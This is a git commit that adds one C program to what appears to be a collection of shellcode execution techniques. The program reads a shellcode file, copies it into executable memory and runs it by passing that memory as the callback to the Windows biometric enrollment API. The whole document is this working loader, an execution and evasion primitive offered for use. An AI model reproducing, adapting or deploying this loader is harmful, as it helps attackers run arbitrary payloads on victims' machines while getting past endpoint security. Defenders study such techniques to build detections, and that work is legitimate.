b14856531bb90f6651823fd42f33f9549fa6fc0f
Wra7h <60988551+Wra7h@users.noreply.github.com>
2022-09-21 20:35:11 -0700

    3 New Methods [Sept 21]

---
+++ C/WinBioEnrollCaptureWithCallback.c
@@ -0,0 +1,67 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Winbio.lib")
+
+#include <stdio.h>
+#include <windows.h>
+#include <winbio.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	WINBIO_SESSION_HANDLE hBioSession = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: WinBioEnrollCaptureWithCallback.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, NULL, 0, WINBIO_DB_DEFAULT, &hBioSession);
+
+	WinBioEnrollCaptureWithCallback(hBioSession, hAlloc, NULL);
+
+	WinBioWait(hBioSession);
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	if (hBioSession)
+		WinBioCloseSession(hBioSession);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
